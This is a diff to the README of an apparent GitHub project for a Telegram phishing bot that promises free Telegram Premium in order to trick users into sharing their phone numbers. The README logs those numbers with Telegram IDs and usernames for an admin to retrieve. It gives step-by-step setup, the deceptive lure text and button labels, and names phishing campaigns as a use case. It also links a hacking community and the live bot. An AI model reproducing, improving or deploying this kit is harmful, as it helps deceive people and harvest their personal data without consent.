@@ -1,164 +1,184 @@
 # Free Telegram Premium Phonenumber Phishing Bot 🤖
 
-Python: 3.9+ Telegram Bot API
+Python: 3.9+ | Telegram Bot API
 
+---
 
 ## Table of Contents 📚
 
-- [Introduction](#introduction-) 🤔
-- [Features](#features-) 🎉
-- [Installation](#installation-) 💻
-- [Usage](#usage-) 📱
-- [Configuration](#configuration-) 🔧
-- [License](#license-) 📜
-- [Example Use Cases](#example-use-cases-️) 🖍️
-- [Code Structure](#code-structure-️) 🗂️
-- [API Documentation](#api-documentation-) 📚
-- [Commit Messages](#commit-messages-️) 🖍️
-- [Community](#community) 👥
+- [Introduction](#introduction-🤔)
+- [Features](#features-🎉)
+- [Installation](#installation-💻)
+- [Usage](#usage-📱)
+- [Configuration](#configuration-🔧)
+- [License](#license-📜)
+- [Example Use Cases](#example-use-cases-🖍%ef%b8%8f)
+- [Code Structure](#code-structure-🗂%ef%b8%8f)
+- [API Documentation](#api-documentation-📚)
+- [Commit Messages](#commit-messages-🖍%ef%b8%8f)
+- [Community](#community-👥)
+
 ---
 
 ## Introduction 🤔
 
-This is a Telegram bot designed to trick users into sharing their phone numbers under the guise of providing free Telegram Premium access 🤝.
+This Telegram bot is designed to trick users into sharing their phone numbers under the guise of providing free Telegram Premium access. It uses the Telegram Bot API to interact with users and securely logs their phone numbers, IDs, and usernames.
 
-The bot uses the Telegram Bot API to interact with users and saves their phone numbers along with IDs and usernames 📱.
-
-You can modify the text, button labels for the phone number sharing prompt, and the image displayed in the bot.
+The bot’s functionality, appearance, and messaging can be customized to suit your requirements.
 
 ---
 
-![photo_5969548008347517558_y](https://github.com/user-attachments/assets/b0bb342c-5a56-4ddd-87ac-7885a3275d81)
+![Example Bot UI](https://github.com/user-attachments/assets/b0bb342c-5a56-4ddd-87ac-7885a3275d81)
 
 ---
 
 ## Features 🎉
 
-- Provides free Telegram Premium access to users 🤝.
-- Users can share their phone number to receive premium access 📞.
-- Admins can view the list of users who have shared their phone numbers using the `/show` command 👀.
-- The bot uses a password to protect the `/show` command 🔒.
-- The bot sends a welcome message with a picture and button to share hes phone number masked with text 📸.
+- **Free Telegram Premium Trial Offer**: Tempts users to share their phone number for a supposed premium trial.
+- **Phone Number Logging**: Collects and saves users' phone numbers, Telegram IDs, and usernames.
+- **Admin Tools**: Allows admins to view logged phone numbers via the `/show` command.
+- **Password Protection**: Secures the admin command with a customizable password.
+- **Customizable UI**: Change the welcome message, image, and button text to match your preferences.
+- **Message Cleanup**: Deletes old messages to maintain a clean chat interface.
 
 ---
 
 ## Installation 💻
 
-To install the bot, follow these steps:
+Follow these steps to install and configure the bot:
 
-1. **Clone the repository**: Clone the repository using:
+### 1. Clone the Repository
+Clone the repository to your local machine:
+```bash
+git clone https://github.com/BlackNnja/Telegram-Phishing-Bot.git
+cd Telegram-Phishing-Bot
+```
 
-   ```bash
-    git clone https://github.com/BlackNnja/Telegram-Phishing-Bot.git
-    ```
-   
-    the cd to the 📁
+### 2. Install Python
+Ensure Python 3.9 or later is installed. You can download it from the [official Python website](https://www.python.org/downloads/).
 
-4. **Install Python**: Make sure you have Python 3.9 or later installed on your system. You can download it from the [official Python website](https://www.python.org/downloads/) 🔢.
-5. 
+### 3. Install Dependencies
+Install the required Python libraries:
+```bash
+pip install -r requirements.txt
+```
 
-6. **Install python-telegram-bot**: Install the python-telegram-bot library using pip:
+### 4. Obtain a Telegram Bot Token
+- Create a bot on Telegram using [BotFather](https://core.telegram.org/bots#botfather).
+- Copy the bot token provided by BotFather.
 
-     ```bash
-    pip install python-telegram-bot==13.15
-    ```
-    📦
+### 5. Configure the Bot Token
+Replace `YOUR_BOT_TOKEN` in the `bot.py` file with your actual bot token:
+```python
+BOT_TOKEN = "YOUR_BOT_TOKEN"
+```
 
-9. **Install other dependencies**: Install the other dependencies required by the bot using pip:    ```bash
-    pip install -r req.txt    ```
-    💻
-
-10. **Replace `YOUR_BOT_TOKEN`**: Replace `YOUR_BOT_TOKEN` with your actual bot token in the `main.py` file 🔑.
-
-11. **Run the bot**: Run the bot using:    ```bash
-    python bot.py    ```
-    🚀
+### 6. Run the Bot
+Start the bot with:
+```bash
+python bot.py
+```
+The bot will now listen for user interactions.
 
 ---
 
 ## Usage 📱
 
-To use the bot, follow these steps:
+### For Users
+1. **Start the Bot**:
+   - Send `/start` to the bot.
+   - Receive a welcome message with instructions.
 
-1. **Start the bot**: Start the bot by sending the `/start` command 📱.
- 
-3. **Share your phone number**: Share your phone number with the bot to receive premium access 📞.
- 
-5. **Users That knows the password can view users**: Users can view the list of users who have shared their phone number using the `/show {PASSWORD}` command 👀.
+2. **Share Your Phone Number**:
+   - Tap the provided button to share your phone number.
+
+3. **Receive Confirmation**:
+   - The bot confirms the number has been logged.
+
+### For Admins
+1. **View Logged Numbers**:
+   - Use `/show {PASSWORD}` to retrieve the list of logged phone numbers.
+   - The bot sends a file (`user_data.txt`) containing the data.
+
+2. **Password Protection**:
+   - Change the password in the `main.py` file for added security.
 
 ---
 
 ## Configuration 🔧
 
-The bot uses a password to protect the `/show` command 🔒. You can change the password by modifying the `password` variable in the `main.py` file 🔑.
+### 1. Welcome Image
+Replace the default image:
+1. Save your custom image in the bot’s folder.
+2. Update the image path in the `send_welcome_message` function:
+   ```python
+   with open('new_image.png', 'rb') as photo:
+   ```
 
-To configure the bot's appearance and functionality:
-
-1. **Change the Welcome Image**:
-   - Replace the image file in the folder with your own image.
-   - Update the path to the new image in the `send_welcome_message()` function in `bot.py`.
-     ```
-         with open('telegramicon.png', 'rb') as photo:
-     ```
-
-2. **Modify the Button Labels**:
-   - Edit the `button_text` var in the `send_welcome_message()` function to customize the text of the buttons.
-
-   Example:   ```python
-    button_text = "⭐️ Get Free 3 months Telegram Premium"```
-
-3. **Customize the Text and Picture**:
-   - Edit the strings in the `send_welcome()` function to update the welcome message and other text.
-
+### 2. Button Labels
+Modify the button text in the `send_welcome_message` function:
 ```python
-                caption=("🎉 Welcome to Free Telegram Premium 🎉\n\n"
-                         "You can get 3 months of Telegram Premium for free!\n\n"
-                         "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
-                         "Happy Using And Keep Coming Back Every 3 Months! 😊"),
-                reply_markup=reply_markup
-            )
+button_text = "⭐️ Get Free 3 months Telegram Premium"
+```
+
+### 3. Custom Text
+Update the welcome message text in the same function:
+```python
+caption = (
+    "🎉 Welcome to Free Telegram Premium 🎉\n\n"
+    "You can get 3 months of Telegram Premium for free!\n\n"
+    "To get started, tap the button below to share your phone number."
+)
+```
+
+### 4. Password Protection
+Change the admin password in the `show_users` function:
+```python
+password = "YOUR_NEW_PASSWORD"
 ```
 
 ---
 
 ## License 📜
 
-This project is licensed under the MIT License 📜. See the LICENSE file for more information.
+This project is licensed under the MIT License. Refer to the LICENSE file for details.
 
 ---
 
 ## Example Use Cases 🖍️
 
-- Users share their phone numbers with the bot to receive premium access 📞.
-- Admins use the `/show` command to view the list of users who have shared their phone numbers 👀.
+- Phishing campaigns to collect Telegram user phone numbers.
+- Research projects requiring user interaction via Telegram.
+- Educational purposes for learning about bot development and Telegram API usage.
 
 ---
 
 ## Code Structure 🗂️
 
-The code is structured into the following files:
-
-- `bot.py`: The main file that contains the bot's logic 🖍️.
-- `requirements.txt`: The file that contains the required dependencies 💻.
+- `bot.py`: Main bot logic.
+- `requirements.txt`: Dependency list.
+- `user_data.txt`: Stores collected phone numbers, IDs, and usernames.
 
 ---
 
 ## API Documentation 📚
 
-The bot uses the Telegram Bot API to interact with users 📱. You can find the API documentation at [Telegram Bot API](https://core.telegram.org/bots/api).
+This bot leverages the Telegram Bot API. Full documentation can be found at [Telegram Bot API](https://core.telegram.org/bots/api).
 
 ---
 
 ## Commit Messages 🖍️
 
-Commit messages should follow the standard format:
-
-- `feat`: Add new feature 🎉
-- `fix`: Fix bug 🚨
+Use these prefixes for clear and consistent commit messages:
+- `feat`: Add a new feature.
+- `fix`: Resolve a bug.
+- `docs`: Update documentation.
+- `refactor`: Improve code without adding new features.
 
 ---
 
-## Community
+## Community 👥
 
-- Join our community on Telegram: [t.me/israelihacker](https://t.me/israelihacker)
-- Visit the original bot: [t.me/Premium_TelegramTrial_bot](https://t.me/Premium_TelegramTrial_bot)
+- Join our Telegram community: [t.me/israelihacker](https://t.me/israelihacker)
+- Check out the original bot: [t.me/Premium_TelegramTrial_bot](https://t.me/Premium_TelegramTrial_bot)
+
